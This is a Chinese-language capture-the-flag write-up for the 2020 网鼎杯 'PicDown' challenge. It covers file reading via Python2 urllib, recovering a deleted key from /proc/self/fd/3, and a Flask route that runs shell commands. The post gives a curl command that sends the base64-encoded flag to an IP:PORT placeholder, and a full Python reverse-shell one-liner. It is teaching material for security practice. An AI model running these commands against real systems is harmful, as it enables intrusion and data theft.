---
title: 网鼎杯2020白虎组-PicDown
date: 2025-04-02 21:38:54
tags:
- 文件读取
- Python-Flask框架审计
- Linux特殊文件
- python反弹shell
category:
- 刷题笔记
---

# 网鼎杯2020白虎组-PicDown

[参考文章](https://blog.csdn.net/qq_46143339/article/details/146094942)

首先启动靶机并访问，发现只有一个输入框

发现这个输入框能够读取文件并以图片格式下载下来，所以我们可以利用url参数来尝试文件读取

## 知识点

### Python2 urllib 特性

```
Python2 的 urllib.urlopen 支持直接输入文件路径（如 /etc/passwd），无需 file:// 前缀。通过提交路径 /proc/self/cmdline 确认应用为 Python 进程，并获取启动命令 /usr/bin/python /app/app.py，确定工作目录为 /app。
读取应用源码
通过路径 `/app/app.py` 获取 Flask 代码（篇幅问题完整代码和解析放在文章结尾），关键逻辑如下：
```

---

获取启动指定进程的完整命令

```
/proc/self/cmdline
```

获得

```
python2 app.py
```

读取文件

```
/proc/self/cwd/app.py
或者直接
/app/app.py
```

得到源码

```
from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)


@app.route('/')
def index():
    return render_template('search.html')


@app.route('/page')
def page():
    url = request.args.get("url")
    try:
        if not url.lower().startswith("file"):
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype='application/octet-stream')
            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
            return response
        else:
            value = "HACK ERROR!"
    except:
        value = "SOMETHING WRONG!"
    return render_template('search.html', res=value)


@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"

    return res


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

代码审计

发现/no_one_know_the_manager路由有shell，需要密钥SECRET_KEY

```
SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)
```

**fd 是一个目录，里面包含着当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。这里3为爆破得出。**

但是这里密钥被删除了，但是没有关闭，

可通过 `/proc/self/fd/[num]` 读取内容。遍历文件描述符（通常 `fd/3` 为第一个打开的文件）：

```
?url=/proc/self/fd/3

#6A52Bigqn8UFGyTxvnvmgv/gOz75bVn4RXaiZMC302s=
```

得到密钥后访问路由并且传入shell就可以了

```
/no_one_know_the_manager?key=6A52Bigqn8UFGyTxvnvmgv/gOz75bVn4RXaiZMC302s=&shell=命令
```

## 解法一 数据外带

**外带数据**：通过 `curl` 将命令结果发送到远程服务器

```
url/no_one_know_the_manager?key=6A52Bigqn8UFGyTxvnvmgv/gOz75bVn4RXaiZMC302s=&shell=curl http://IP:PORT/$(cat /flag|base64)
```

## 解法二 反弹shell

```
url/no_one_know_the_manager?key=6A52Bigqn8UFGyTxvnvmgv/gOz75bVn4RXaiZMC302s=&shell=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

反弹shell代码结构分析

```
  python -c '
  import socket, subprocess, os;
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
  s.connect(("IP", PORT));
  os.dup2(s.fileno(), 0);
  os.dup2(s.fileno(), 1);
  os.dup2(s.fileno(), 2);
  p = subprocess.call(["/bin/sh", "-i"]);
  '
```

然后服务器开启监听 nc -lvvp PORT，最终在根目录 `/flag` 或 `/root/flag.txt` 获取 Flag。













